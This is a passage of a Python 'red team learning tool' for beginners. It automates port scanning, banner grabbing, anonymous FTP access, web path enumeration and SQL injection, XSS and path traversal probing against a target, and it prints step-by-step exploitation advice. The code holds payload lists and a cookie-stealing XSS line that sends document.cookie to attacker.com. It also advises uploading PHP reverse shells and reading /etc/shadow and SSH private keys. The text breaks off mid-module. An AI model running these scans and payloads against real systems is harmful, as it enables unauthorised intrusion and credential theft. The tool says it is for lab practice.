#!/usr/bin/env python3
"""
============================================================
  RED TEAM LEARNING TOOL v2.0 - For Beginners
  VulnHub / HackTheBox / DVWA / TryHackMe
  
  Modules:
    ✓ Host Discovery + OS Fingerprinting
    ✓ Port Scanning
    ✓ Banner Grabbing
    ✓ FTP Anonymous Login
    ✓ Web Enumeration
    ✓ SQL Injection Detection
    ✓ XSS Detection
    ✓ LFI / Path Traversal Detection
    ✓ CMS Detection (WordPress, Joomla, Drupal)
    ✓ HTTP Security Headers Check
    ✓ SSH Brute Force (with wordlist)
    ✓ FTP Brute Force
    ✓ HTTP Login Form Brute Force
    ✓ SMB Enumeration
    ✓ Default Credentials (MySQL, Redis, Telnet)
    ✓ Post-Exploitation Checklist Generator
    ✓ Reverse Shell Payload Generator
    ✓ HTML Report Generator
    
  ⚠  Educational use ONLY. Use on your own VMs!
============================================================
"""

import socket
import subprocess
import sys
import os
import time
import json
import datetime
import ftplib
import threading
from urllib.parse import urlencode

# ── Optional imports ──────────────────────────────────────
try:
    import requests
    requests.packages.urllib3.disable_warnings()
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    import paramiko
    HAS_PARAMIKO = True
except ImportError:
    HAS_PARAMIKO = False

# ─────────────────────────────────────────────────────────
#  COLORS
# ─────────────────────────────────────────────────────────
class C:
    RED    = "\033[91m"
    GREEN  = "\033[92m"
    YELLOW = "\033[93m"
    BLUE   = "\033[94m"
    MAGENTA= "\033[95m"
    CYAN   = "\033[96m"
    WHITE  = "\033[97m"
    BOLD   = "\033[1m"
    DIM    = "\033[2m"
    RESET  = "\033[0m"

# ─────────────────────────────────────────────────────────
#  GLOBAL REPORT STORAGE
# ─────────────────────────────────────────────────────────
REPORT = {
    "target": "",
    "scan_time": "",
    "host_alive": False,
    "os_guess": "Unknown",
    "open_ports": {},
    "banners": {},
    "vulnerabilities": [],
    "web_paths": [],
    "credentials_found": [],
    "smb_info": [],
    "cms_detected": [],
    "sqli_found": [],
    "xss_found": [],
    "lfi_found": [],
    "security_headers": {},
    "next_steps": [],
}

def add_vuln(severity, title, description, exploit_hint):
    REPORT["vulnerabilities"].append({
        "severity": severity,
        "title": title,
        "description": description,
        "exploit_hint": exploit_hint
    })

# ─────────────────────────────────────────────────────────
#  HELPERS
# ─────────────────────────────────────────────────────────
def banner_art():
    print(f"""
{C.RED}{C.BOLD}
██████╗ ███████╗██████╗     ████████╗███████╗ █████╗ ███╗   ███╗
██╔══██╗██╔════╝██╔══██╗    ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║
██████╔╝█████╗  ██║  ██║       ██║   █████╗  ███████║██╔████╔██║
██╔══██╗██╔══╝  ██║  ██║       ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║
██║  ██║███████╗██████╔╝       ██║   ███████╗██║  ██║██║ ╚═╝ ██║
╚═╝  ╚═╝╚══════╝╚═════╝        ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝
{C.RESET}{C.YELLOW}           v2.0  — Red Team Learning Tool for Beginners
{C.CYAN}        VulnHub · HackTheBox · TryHackMe · DVWA · OffSec Labs
{C.RED}    ⚠  ONLY use on machines you OWN or have written permission to test!{C.RESET}
""")

def explain(title, text):
    print(f"\n{C.CYAN}{C.BOLD}╔══ 📚 {title} {'═'*max(0,50-len(title))}╗{C.RESET}")
    for line in text.strip().split("\n"):
        print(f"{C.BLUE}  {line}{C.RESET}")
    print(f"{C.CYAN}{C.BOLD}╚{'═'*55}╝{C.RESET}\n")

def step(num, desc):
    print(f"\n{C.GREEN}{C.BOLD}{'━'*60}")
    print(f"  STEP {num}: {desc}")
    print(f"{'━'*60}{C.RESET}")

def info(msg):   print(f"  {C.YELLOW}[*]{C.RESET} {msg}")
def found(msg):  print(f"  {C.GREEN}[+]{C.RESET} {msg}")
def warn(msg):   print(f"  {C.RED}[-]{C.RESET} {msg}")
def tip(msg):    print(f"  {C.MAGENTA}[💡]{C.RESET} {msg}")


def manual_steps(title, steps):
    """Print a 'How to do it manually' section. steps = list of strings."""
    print(f"\n  {C.CYAN}{C.BOLD}📋 {title}{C.RESET}")
    for i, s in enumerate(steps, 1):
        print(f"  {C.BLUE}  {i}. {s}{C.RESET}")
    print()


def troubleshoot(problems):
    """Print a 'Having problems?' section. problems = list of (symptom, solution) tuples."""
    print(f"\n  {C.YELLOW}{C.BOLD}🔧 Having problems?{C.RESET}")
    for symptom, solution in problems:
        print(f"  {C.RED}  • {symptom}{C.RESET}")
        print(f"  {C.GREEN}    → {solution}{C.RESET}")
    print()


# ─────────────────────────────────────────────────────────
#  SECLISTS / WORDLIST DIRECTORY
# ─────────────────────────────────────────────────────────
# Path to SecLists-style wordlist directory (common on Linux pentest VMs)
SECLISTS_DIR = "/usr/share/wordlist/Seclist"
# Fallback if installed as 'wordlists' and 'SecLists'
SECLISTS_DIR_FALLBACK = "/usr/share/wordlists/SecLists"


def read_seclist_directory(dir_path=None, recursive=False, max_depth=2):
    """
    Read contents of the SecLists/wordlist directory.
    Returns list of dicts: [{"name": "...", "path": "...", "is_dir": bool}, ...]
    If directory does not exist, tries SECLISTS_DIR_FALLBACK, then returns [].
    """
    path = dir_path or SECLISTS_DIR
    if not os.path.isdir(path):
        path = SECLISTS_DIR_FALLBACK
    if not os.path.isdir(path):
        return []

    result = []
    try:
        for name in sorted(os.listdir(path)):
            full = os.path.join(path, name)
            is_dir = os.path.isdir(full)
            result.append({"name": name, "path": full, "is_dir": is_dir})
            if recursive and is_dir and max_depth > 0:
                for sub in read_seclist_directory(full, recursive=True, max_depth=max_depth - 1):
                    result.append({**sub, "path": os.path.join(full, sub["name"])})
    except (OSError, PermissionError):
        pass
    return result


def get_seclist_wordlist_files(dir_path=None, extensions=None):
    """
    Return list of wordlist file paths under SECLISTS_DIR (non-recursive for top-level,
    or pass dir_path to a subdir). Optional filter by extensions, e.g. ('.txt',).
    """
    if extensions is None:
        extensions = (".txt", ".lst", "")
    path = dir_path or SECLISTS_DIR
    if not os.path.isdir(path):
        path = SECLISTS_DIR_FALLBACK
    if not os.path.isdir(path):
        return []

    files = []
    try:
        for name in sorted(os.listdir(path)):
            full = os.path.join(path, name)
            if os.path.isfile(full) and (not extensions or any(name.endswith(ext) for ext in extensions)):
                files.append(full)
    except (OSError, PermissionError):
        pass
    return files

# ─────────────────────────────────────────────────────────
#  STEP 1: HOST DISCOVERY + OS FINGERPRINTING
# ─────────────────────────────────────────────────────────
def host_discovery(target):
    step(1, "Host Discovery & OS Fingerprinting")
    explain("Host Discovery + OS Fingerprinting",
        "PING: We check if the host is online using ICMP echo (ping).\n"
        "\n"
        "OS FINGERPRINTING via TTL:\n"
        "  Every OS sends packets with a 'Time To Live' (TTL) value.\n"
        "  TTL ≈ 64  → Linux / Unix / macOS\n"
        "  TTL ≈ 128 → Windows\n"
        "  TTL ≈ 255 → Network device (router, switch)\n"
        "\n"
        "This helps us know what kind of exploits to look for!\n"
        "Real tool: nmap -O <target>  (full OS detection)")

    info(f"Pinging {target}...")
    param = "-n" if sys.platform == "win32" else "-c"
    result = subprocess.run(["ping", param, "3", target],
                            capture_output=True, text=True, timeout=10)

    if result.returncode == 0:
        found(f"{target} is ALIVE!")
        REPORT["host_alive"] = True

        # TTL-based OS guess
        output = result.stdout
        ttl_val = None
        for line in output.split("\n"):
            if "ttl=" in line.lower():
                try:
                    ttl_val = int(line.lower().split("ttl=")[1].split()[0])
                    break
                except:
                    pass

        if ttl_val:
            if ttl_val <= 64:
                os_guess = f"Linux/Unix (TTL={ttl_val})"
            elif ttl_val <= 128:
                os_guess = f"Windows (TTL={ttl_val})"
            else:
                os_guess = f"Network Device (TTL={ttl_val})"
            found(f"OS Guess: {C.YELLOW}{os_guess}{C.RESET}")
            REPORT["os_guess"] = os_guess
    else:
        warn(f"{target} did not respond to ping (firewall may block ICMP — try anyway)")

    tip(f"To find your VulnHub VM IP: sudo arp-scan -l")
    tip(f"Full OS detection: sudo nmap -O {target}")


# ─────────────────────────────────────────────────────────
#  STEP 2: PORT SCANNING
# ─────────────────────────────────────────────────────────
COMMON_PORTS = {
    21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP",
    53: "DNS", 80: "HTTP", 110: "POP3", 111: "RPCbind",
    135: "MSRPC", 139: "NetBIOS", 143: "IMAP", 443: "HTTPS",
    445: "SMB", 512: "rexec", 513: "rlogin", 514: "rsh",
    873: "rsync", 1433: "MSSQL", 1521: "Oracle",
    2049: "NFS", 3306: "MySQL", 3389: "RDP",
    4444: "Metasploit?", 5432: "PostgreSQL",
    5900: "VNC", 6379: "Redis", 6667: "IRC",
    8080: "HTTP-Alt", 8443: "HTTPS-Alt", 8888: "HTTP-Alt2",
    9200: "Elasticsearch", 27017: "MongoDB",
}

def port_scan(target):
    step(2, "Port Scanning — Finding Open Doors")
    explain("Port Scanning",
        "Every service on a computer listens on a numbered 'port' (0–65535).\n"
        "Think of ports as apartment doors — each one leads to a different service.\n"
        "\n"
        "We do a TCP Connect scan: try to open a connection to each port.\n"
        "  OPEN   = service is running and accepting connections\n"
        "  CLOSED = nothing there\n"
        "  FILTERED = firewall is blocking us\n"
        "\n"
        "Key ports to look for:\n"
        "  21 FTP    → Often has anonymous login or weak creds\n"
        "  22 SSH    → Remote shell — brute force or key issues\n"
        "  80 HTTP   → Web app — SQLi, XSS, LFI, RCE...\n"
        "  139/445   → SMB — EternalBlue, pass-the-hash\n"
        "  3306      → MySQL exposed — try root with no password!\n"
        "\n"
        "Real tool: nmap -sV -sC -p- --open -T4 <target>")

    open_ports = {}
    info(f"Scanning {len(COMMON_PORTS)} common ports on {target} (be patient)...")

    for port, service in COMMON_PORTS.items():
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.8)
        if sock.connect_ex((target, port)) == 0:
            found(f"Port {port:5d}  {service:15s}  OPEN")
            open_ports[port] = service
            add_vuln("INFO", f"Port {port} ({service}) Open",
                     f"Service {service} is running on port {port}.",
                     f"Investigate {service} for misconfigurations or exploits.")
        sock.close()

    if not open_ports:
        warn("No common ports open. Try: nmap -p- --open -T4 " + target)

    REPORT["open_ports"] = open_ports
    return open_ports


# ─────────────────────────────────────────────────────────
#  STEP 3: BANNER GRABBING
# ─────────────────────────────────────────────────────────
def banner_grab(target, open_ports):
    step(3, "Banner Grabbing — Identifying Exact Software Versions")
    explain("Banner Grabbing",
        "When you connect to a service, it often sends a 'hello' message = banner.\n"
        "This banner reveals the exact software and VERSION running.\n"
        "\n"
        "Example:\n"
        "  SSH banner: 'SSH-2.0-OpenSSH_7.2p2 Ubuntu'\n"
        "  → Google: 'OpenSSH 7.2p2 exploit' → CVE-2016-6210 found!\n"
        "\n"
        "After finding a version:\n"
        "  1. searchsploit <service> <version>   (local exploit DB)\n"
        "  2. https://exploit-db.com             (search online)\n"
        "  3. https://nvd.nist.gov               (CVE database)")

    banners = {}
    for port in open_ports:
        try:
            s = socket.socket()
            s.settimeout(3)
            s.connect((target, port))
            if port in [80, 8080, 8888, 8443]:
                s.send(b"HEAD / HTTP/1.0\r\nHost: " + target.encode() + b"\r\n\r\n")
            elif port == 25:
                s.send(b"EHLO test\r\n")
            data = s.recv(1024).decode(errors='ignore').strip()
            if data:
                preview = data[:150].replace('\n', ' | ')
                found(f"Port {port}: {preview}")
                banners[port] = data
            s.close()
        except:
            pass

    REPORT["banners"] = banners
    return banners


# ─────────────────────────────────────────────────────────
#  STEP 4: FTP ANONYMOUS LOGIN
# ─────────────────────────────────────────────────────────
def check_ftp(target, open_ports):
    if 21 not in open_ports:
        return

    step(4, "FTP — Anonymous Login & Brute Force")
    explain("FTP Anonymous Login",
        "FTP (File Transfer Protocol) often has a misconfiguration:\n"
        "  → Username: anonymous  Password: anything\n"
        "\n"
        "If anonymous login works:\n"
        "  • Download all files (credentials, configs, SSH keys!)\n"
        "  • If writable: upload a PHP reverse shell to web root\n"
        "  • Check if /var/www/html is the FTP root!\n"
        "\n"
        "Manual exploit:\n"
        "  ftp <target>\n"
        "  Name: anonymous\n"
        "  Password: [press Enter]\n"
        "  ftp> ls -la\n"
        "  ftp> get secret.txt\n"
        "  ftp> put shell.php   ← if writable!")

    # Anonymous login test
    try:
        ftp = ftplib.FTP(timeout=5)
        ftp.connect(target, 21)
        ftp.login("anonymous", "anonymous@redteam.local")
        found("ANONYMOUS FTP LOGIN SUCCESSFUL!")
        info("Directory listing:")
        try:
            ftp.retrlines("LIST")
        except:
            pass

        # Check if writable
        try:
            ftp.mkd("test_write_redteam")
            ftp.rmd("test_write_redteam")
            found("FTP directory is WRITABLE!")
            add_vuln("CRITICAL", "FTP Anonymous Login + Writable",
                     "FTP allows anonymous login AND directory is writable.",
                     "Upload a PHP reverse shell → trigger via web browser if FTP root = web root.")
        except:
            add_vuln("HIGH", "FTP Anonymous Login",
                     "FTP allows anonymous login (read access).",
                     "Download all files, look for credentials, SSH keys, config files.")

        ftp.quit()

        print(f"\n  {C.RED}{C.BOLD}🔥 EXPLOITATION PATH:{C.RESET}")
        print(f"  1. ftp {target}  →  login as anonymous")
        print(f"  2. ls -la  →  look for interesting files")
        print(f"  3. get <filename>  →  download them all")
        print(f"  4. If writable: put shell.php  →  visit http://{target}/shell.php")

    except ftplib.error_perm:
        warn("Anonymous FTP login denied")
    except Exception as e:
        warn(f"FTP check failed: {e}")

    # Command → Manual steps → Troubleshooting
    print(f"\n  {C.MAGENTA}{C.BOLD}📌 Command to try:{C.RESET}  ftp {target}")
    manual_steps("How to do it manually (FTP anonymous)", [
        f"Open a terminal and run:  ftp {target}",
        "When prompted for Name: type  anonymous  (or leave blank)",
        "When prompted for Password: press Enter (or type anything)",
        "At ftp> prompt:  ls -la   to list files",
        "Download a file:  get filename.txt   (use  mget *  for all)",
        "If directory is writable:  put shell.php   then visit http://" + target + "/shell.php in browser",
    ])
    troubleshoot([
        ("Connection refused or timed out", "VM may be off or port 21 closed. Run: nmap -p 21 " + target + "  and ensure VM is on same network (e.g. NAT)."),
        ("Login incorrect / 530 Login authentication failed", "This host does not allow anonymous FTP. Try FTP brute force (Step 10) or skip."),
        ("ftp: command not found", "On Windows use a client (FileZilla, WinSCP) or enable FTP in Windows Features. On Linux: sudo apt install ftp."),
    ])


# ─────────────────────────────────────────────────────────
#  STEP 5: WEB ENUMERATION + CMS DETECTION + HEADERS
# ─────────────────────────────────────────────────────────
WEB_WORDLIST = [
    "", "admin", "administrator", "login", "dashboard", "portal", "panel",
    "backup", "backups", "config", "configuration", "test", "dev", "development",
    "uploads", "upload", "files", "file", "images", "img", "media", "assets",
    "robots.txt", "sitemap.xml", ".htaccess", ".htpasswd", "phpinfo.php",
    "wp-login.php", "wp-admin", "wp-config.php", "wp-content",
    "index.php", "index.html", "shell.php", "cmd.php", "c99.php",
    "README.md", "CHANGELOG.md", ".git/HEAD", ".git/config",
    "server-status", "server-info", "phpmyadmin", "pma", "mysql",
    "cms", "blog", "api", "v1", "v2", "console", "manager",
    "joomla", "drupal", "magento", "typo3", "moodle",
    "cgi-bin", "cgi-bin/test-cgi", "cgi-bin/printenv",
    "etc/passwd", "proc/self/environ",
]

CMS_FINGERPRINTS = {
    "WordPress":  ["/wp-login.php", "/wp-admin/", "/wp-content/"],
    "Joomla":     ["/administrator/", "/components/", "/modules/"],
    "Drupal":     ["/user/login", "/sites/default/", "/core/"],
    "Magento":    ["/downloader/", "/app/etc/", "/skin/frontend/"],
    "phpMyAdmin": ["/phpmyadmin/", "/pma/", "/phpMyAdmin/"],
}

SECURITY_HEADERS = [
    "X-Frame-Options",
    "X-XSS-Protection",
    "X-Content-Type-Options",
    "Content-Security-Policy",
    "Strict-Transport-Security",
    "Referrer-Policy",
    "Permissions-Policy",
]

def web_enumeration(target, open_ports):
    if not HAS_REQUESTS:
        warn("Install requests: pip install requests")
        return

    web_ports = [p for p in open_ports if p in [80, 443, 8080, 8443, 8888]]
    if not web_ports:
        return

    step(5, "Web Enumeration — Directories, CMS, Security Headers")
    explain("Web Enumeration",
        "Web apps often have hidden directories and files:\n"
        "  /admin       → Admin panels (default creds!)\n"
        "  /backup      → Leaked database dumps or source code\n"
        "  /.git        → ENTIRE source code exposed!\n"
        "  /phpinfo.php → Server config, PHP version, paths\n"
        "  /robots.txt  → Owner lists paths they want HIDDEN\n"
        "\n"
        "CMS Detection: Identifies WordPress, Joomla, Drupal\n"
        "  → CMS = known vulnerabilities + plugin exploits\n"
        "\n"
        "Security Headers: Missing headers = exploitable!\n"
        "  No X-Frame-Options → Clickjacking attack\n"
        "  No CSP             → XSS attacks easier\n"
        "\n"
        "Real tools: gobuster, dirb, feroxbuster, nikto, wpscan")

    for port in web_ports:
        scheme = "https" if port == 443 else "http"
        base = f"{scheme}://{target}" if port in [80, 443] else f"{scheme}://{target}:{port}"
        info(f"Enumerating {base}")

        # ── Security Headers ──────────────────────────────
        try:
            r = requests.get(base, timeout=5, verify=False)
            missing = []
            present = []
            for h in SECURITY_HEADERS:
                if h.lower() in [k.lower() for k in r.headers]:
                    present.append(h)
                else:
                    missing.append(h)
            if missing:
                warn(f"Missing security headers: {', '.join(missing)}")
                add_vuln("MEDIUM", "Missing HTTP Security Headers",
                         f"Missing: {', '.join(missing)}",
                         "Missing headers enable XSS, clickjacking, MIME sniffing attacks.")
            else:
                found("All major security headers present")
            REPORT["security_headers"] = {"missing": missing, "present": present}

            # Server header leak
            server = r.headers.get("Server", "")
            if server:
                found(f"Server header: {server}")
                tip(f"Search '{server}' on exploit-db.com for known CVEs!")
        except:
            pass

        # ── Directory Enumeration ─────────────────────────
        info("Scanning common paths...")
        for path in WEB_WORDLIST:
            url = f"{base}/{path}"
            try:
                r = requests.get(url, timeout=3, verify=False, allow_redirects=False)
                if r.status_code in [200, 201, 301, 302, 403]:
                    color = C.GREEN if r.status_code == 200 else C.YELLOW
                    label = "FOUND" if r.status_code == 200 else f"REDIR/FORB"
                    print(f"    {color}[{r.status_code}]{C.RESET} {url}")
                    REPORT["web_paths"].append({"url": url, "status": r.status_code})
                    if r.status_code == 200:
                        add_vuln("MEDIUM", f"Accessible path: /{path}",
                                 f"{url} returned HTTP 200",
                                 "Review this path for sensitive data or functionality.")
            except:
                pass

        # ── CMS Detection ─────────────────────────────────
        info("Detecting CMS...")
        for cms, paths in CMS_FINGERPRINTS.items():
            for cpath in paths:
                try:
                    r = requests.get(f"{base}{cpath}", timeout=3, verify=False)
                    if r.status_code in [200, 301, 302, 403]:
                        found(f"CMS Detected: {C.YELLOW}{cms}{C.RESET} ({cpath})")
                        REPORT["cms_detected"].append(cms)
                        add_vuln("HIGH", f"CMS Detected: {cms}",
                                 f"{cms} detected at {base}{cpath}",
                                 f"Run: wpscan --url {base} -e ap,u" if cms == "WordPress"
                                 else f"Run: joomscan --url {base}")
                        break
                except:
                    pass

    # Command → Manual steps → Troubleshooting (Web)
    base_ex = f"http://{target}" if 80 in open_ports else f"http://{target}:{next((p for p in web_ports), 80)}"
    print(f"\n  {C.MAGENTA}{C.BOLD}📌 Command to try:{C.RESET}  gobuster dir -u {base_ex} -w /usr/share/wordlists/dirb/common.txt")
    manual_steps("How to do it manually (Web directories)", [
        f"Install gobuster if needed:  sudo apt install gobuster",
        f"Run:  gobuster dir -u {base_ex} -w /usr/share/wordlists/dirb/common.txt -t 30",
        "Open each found path in your browser (e.g. " + base_ex + "/admin)",
        "Check robots.txt in browser: " + base_ex + "/robots.txt",
        "If WordPress: run  wpscan --url " + base_ex + " -e ap,u",
    ])
    troubleshoot([
        ("No paths found / empty wordlist", "Use a bigger wordlist: /usr/share/wordlists/dirbuster/ or SecLists Discovery/Web-Content."),
        ("Connection refused / timeout", "Target may block you or be down. Check: ping " + target + "  and  curl -I " + base_ex),
        ("gobuster: command not found", "Install: sudo apt install gobuster  (Kali) or download from GitHub."),
    ])


# ─────────────────────────────────────────────────────────
#  STEP 6: SQL INJECTION DETECTION
# ─────────────────────────────────────────────────────────
SQLI_PAYLOADS = [
    ("'", "SQL syntax"),
    ('"', "SQL syntax"),
    ("' OR '1'='1", "Welcome"),
    ("' OR 1=1--", "Welcome"),
    ("admin'--", "Welcome"),
    ("1' AND SLEEP(3)--", ""),       # Time-based blind
    ("1 UNION SELECT NULL--", ""),
]

def sqli_check(target, open_ports):
    if not HAS_REQUESTS:
        return

    web_ports = [p for p in open_ports if p in [80, 443, 8080, 8443]]
    if not web_ports:
        return

    step(6, "SQL Injection Detection")
    explain("SQL Injection (SQLi)",
        "SQL Injection is the #1 web vulnerability!\n"
        "\n"
        "When a web app puts user input directly into a SQL query:\n"
        "  SELECT * FROM users WHERE username='INPUT' AND password='INPUT'\n"
        "\n"
        "Inject: username = admin'--\n"
        "Query becomes: SELECT * FROM users WHERE username='admin'--' AND...\n"
        "  → '--' comments out the rest → password check BYPASSED!\n"
        "\n"
        "Types:\n"
        "  Error-based  → Database error reveals info\n"
        "  Boolean      → True/false responses\n"
        "  Time-based   → SLEEP() causes delay = vulnerable\n"
        "  Union-based  → Extract data from other tables\n"
        "\n"
        "Real tool: sqlmap -u 'http://target/login.php' --data='user=a&pass=b'")

    for port in web_ports:
        scheme = "https" if port == 443 else "http"
        base = f"{scheme}://{target}" if port in [80, 443] else f"{scheme}://{target}:{port}"

        # Common login endpoints to test
        login_paths = ["/login", "/login.php", "/admin/login.php",
                       "/user/login", "/wp-login.php", "/index.php"]

        for lpath in login_paths:
            url = f"{base}{lpath}"
            try:
                # Check if endpoint exists
                r = requests.get(url, timeout=3, verify=False)
                if r.status_code not in [200, 301]:
                    continue

                info(f"Testing SQLi on {url}")
                for payload, indicator in SQLI_PAYLOADS:
                    # Test in username/password fields
                    for field_combo in [
                        {"username": payload, "password": "test"},
                        {"user": payload, "pass": "test"},
                        {"email": payload, "password": "test"},
                        {"log": payload, "pwd": "test"},  # WordPress
                    ]:
                        try:
                            start = time.time()
                            resp = requests.post(url, data=field_combo,
                                                timeout=5, verify=False)
                            elapsed = time.time() - start

                            # Time-based detection
                            if "SLEEP" in payload and elapsed >= 3:
                                found(f"POSSIBLE TIME-BASED SQLi at {url} (delay: {elapsed:.1f}s)")
                                REPORT["sqli_found"].append(url)
                                add_vuln("CRITICAL", "SQL Injection (Time-Based)",
                                         f"URL: {url} | Payload: {payload}",
                                         f"sqlmap -u '{url}' --data='user=1&pass=1' --dbs")

                            # Error-based detection
                            errors = ["sql syntax", "mysql_fetch", "ORA-",
                                     "syntax error", "unclosed quotation",
                                     "sqlite3.OperationalError", "pg_query"]
                            body_lower = resp.text.lower()
                            for err in errors:
                                if err.lower() in body_lower:
                                    found(f"SQL ERROR detected at {url} → possible SQLi!")
                                    found(f"  Payload used: {payload}")
                                    REPORT["sqli_found"].append(url)
                                    add_vuln("CRITICAL", "SQL Injection (Error-Based)",
                                             f"URL: {url} | SQL error in response",
                                             f"sqlmap -u '{url}' --data='user=1&pass=1' --dbs --dump")
                                    break
                        except:
                            pass

            except:
                pass

    if not REPORT["sqli_found"]:
        info("No obvious SQLi found on common login pages (try sqlmap for deeper scan)")
    tip(f"Run: sqlmap -u 'http://{target}/login.php' --data='username=a&password=b' --level=3")

    # Command → Manual steps → Troubleshooting (SQLi)
    base_sqli = f"http://{target}"
    print(f"\n  {C.MAGENTA}{C.BOLD}📌 Command to try:{C.RESET}  sqlmap -u '{base_sqli}/login.php' --data='username=a&password=b' --dbs")
    manual_steps("How to do it manually (SQL injection)", [
        f"In browser, open login page. In username try:  admin'--   (leave password empty). If you get in = SQLi.",
        f"Or try:  ' OR '1'='1   in both fields to bypass login.",
        f"Automated:  sqlmap -u '{base_sqli}/login.php' --data='username=a&password=b' --dbs --batch",
        "Then dump a database:  sqlmap ... -D database_name --tables  and  --dump",
    ])
    troubleshoot([
        ("sqlmap: no parameter found", "Specify the exact POST data. Capture the form with Burp and use --data='user=1&pass=1' with real parameter names."),
        ("WAF blocking / 403", "Use --tamper=space2comment or --random-agent. Try a different injection point (e.g. search box)."),
        ("No SQLi but login is weak", "Focus on HTTP brute force (Step 11) or default credentials."),
    ])


# ─────────────────────────────────────────────────────────
#  STEP 7: XSS DETECTION
# ─────────────────────────────────────────────────────────
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    '"><script>alert(1)</script>',
    "';alert(1)//",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
]

def xss_check(target, open_ports):
    if not HAS_REQUESTS:
        return

    web_ports = [p for p in open_ports if p in [80, 443, 8080, 8443]]
    if not web_ports:
        return

    step(7, "XSS (Cross-Site Scripting) Detection")
    explain("Cross-Site Scripting (XSS)",
        "XSS = injecting JavaScript into a web page that other users see.\n"
        "\n"
        "If a site reflects your input without sanitizing it:\n"
        "  Input: <script>alert(1)</script>\n"
        "  Page shows: A popup → XSS confirmed!\n"
        "\n"
        "Why it's dangerous:\n"
        "  • Steal session cookies → log in as victim\n"
        "  • Redirect users to phishing pages\n"
        "  • Keylog the admin's password\n"
        "  • Deface the website\n"
        "\n"
        "Types:\n"
        "  Reflected  → In the URL, affects only you\n"
        "  Stored     → Saved in database, affects ALL users\n"
        "  DOM-based  → JavaScript processes untrusted data\n"
        "\n"
        "Real tool: XSStrike, Burp Suite")

    for port in web_ports:
        scheme = "https" if port == 443 else "http"
        base = f"{scheme}://{target}" if port in [80, 443] else f"{scheme}://{target}:{port}"

        # Test common search/input parameters
        test_paths = [
            f"{base}/search?q=PAYLOAD",
            f"{base}/?s=PAYLOAD",
            f"{base}/index.php?search=PAYLOAD",
            f"{base}/page.php?id=PAYLOAD",
        ]

        for path_template in test_paths:
            for payload in XSS_PAYLOADS[:2]:  # test just first two for speed
                url = path_template.replace("PAYLOAD", payload)
                try:
                    r = requests.get(url, timeout=3, verify=False)
                    if payload in r.text:
                        found(f"REFLECTED XSS at: {url}")
                        found(f"  Payload reflected: {payload}")
                        REPORT["xss_found"].append(url)
                        add_vuln("HIGH", "Reflected XSS",
                                 f"URL: {url}\nPayload reflected in response.",
                                 "Use payload to steal cookies: <script>document.location='http://attacker.com/?c='+document.cookie</script>")
                except:
                    pass

    if not REPORT["xss_found"]:
        info("No reflected XSS found in common parameters")
    tip("Test manually: add ?search=<script>alert(1)</script> to URLs in your browser")

    # Command → Manual steps → Troubleshooting (XSS)
    base_xss = f"http://{target}"
    print(f"\n  {C.MAGENTA}{C.BOLD}📌 Command to try:{C.RESET}  Add to URL:  ?q=<script>alert(1)</script>   or use XSStrike/Burp")
    manual_steps("How to do it manually (XSS)", [
        f"Find a search or input that echoes back (e.g. {base_xss}/search?q=test).",
        "Replace test with:  <script>alert(1)</script>  — if a popup appears, XSS is confirmed.",
        "Try in different places: search box, comment form, URL parameters.",
        "For stored XSS: submit the payload; then view the page as another user — script runs in their browser.",
    ])
    troubleshoot([
        ("No popup / payload is encoded", "Site may be escaping output. Try polyglot: javascript:alert(1) or <img src=x onerror=alert(1)>."),
        ("Only works in one browser", "Check Content-Type and encoding. Try Burp to see raw response."),
        ("WAF blocks <script>", "Use encoding or alternate tags: <svg onload=alert(1)> or <body onload=alert(1)>."),
    ])


# ─────────────────────────────────────────────────────────
#  STEP 8: LFI / PATH TRAVERSAL DETECTION
# ─────────────────────────────────────────────────────────
LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../../etc/passwd%00",
    "....//....//....//etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "../../../../windows/win.ini",
    "php://filter/convert.base64-encode/resource=index.php",
]

LFI_INDICATORS = ["root:x:0:0", "[fonts]", "bin:x:", "daemon:x:"]

def lfi_check(target, open_ports):
    if not HAS_REQUESTS:
        return

    web_ports = [p for p in open_ports if p in [80, 443, 8080, 8443]]
    if not web_ports:
        return

    step(8, "LFI — Local File Inclusion / Path Traversal")
    explain("Local File Inclusion (LFI)",
        "LFI happens when a web app includes files based on user input:\n"
        "  URL: /page.php?file=about.php\n"
        "\n"
        "Attacker changes 'file' to:\n"
        "  ?file=../../../../etc/passwd\n"
        "  → Server reads /etc/passwd and shows it to you!\n"
        "\n"
        "What you can read:\n"
        "  /etc/passwd        → Usernames on the system\n"
        "  /etc/shadow        → Password hashes (if root)\n"
        "  /var/www/html/config.php → Database credentials!\n"
        "  SSH private keys   → Log in as another user\n"
        "\n"
        "LFI → RCE (Remote Code Execution):\n"
        "  1. Read PHP session files\n"
        "  2. Log poisoning via User-Agent\n"
        "  3. php://filter wrapper to read source code\n"
        "\n"
        "Real tool: ffuf, burp suite, dotdotpwn")

    for port in web_ports:
        scheme = "https" if port == 443 else "http"
        base = f"{scheme}://{target}" if port in [80, 443] else f"{scheme}://{target}:{port}"

        # Common LFI parameters
        lfi_params = ["file", "page", "include", "path", "doc", "document",
                      "template", "view", "load", "read", "content"]

        for param in lfi_params[:5]:  # limit for speed
            for payload in LFI_PAYLOADS[:3]:
                url = f"{base}/index.php?{param}={payload}"
                try:
                    r = requests.get(url, timeout=4, verify=False)
                    for indicator in LFI_INDICATORS:
                        if indicator in r.text:
                            found(f"LFI CONFIRMED at: {url}")
                            found(f"  Indicator found: '{indicator}'")
                            REPORT["lfi_found"].append(url)
                            add_vuln("CRITICAL", "Local File Inclusion (LFI)",
                                     f"URL: {url}\n'{indicator}' found in response.",
                                     "Try reading: /etc/shadow, /var/www/html/config.php, ~/.ssh/id_rsa")
                except:
                    pass

    if not REPORT["lfi_found"]:
        info("No LFI found in common parameters")
    tip(f"Try manually: http://{target}/page.php?file=../../../../etc/passwd")

    # Command → Manual steps → Troubleshooting (LFI)
    base_lfi = f"http://{target}"
    print(f"\n  {C.MAGENTA}{C.BOLD}📌 Command to try:{C.RESET}  {base_lfi}/index.php?file=../../../../etc/passwd")
    manual_steps("How to do it manually (LFI)", [
        f"Find a URL with a file/page parameter, e.g.  {base_lfi}/page.php?file=about.php",
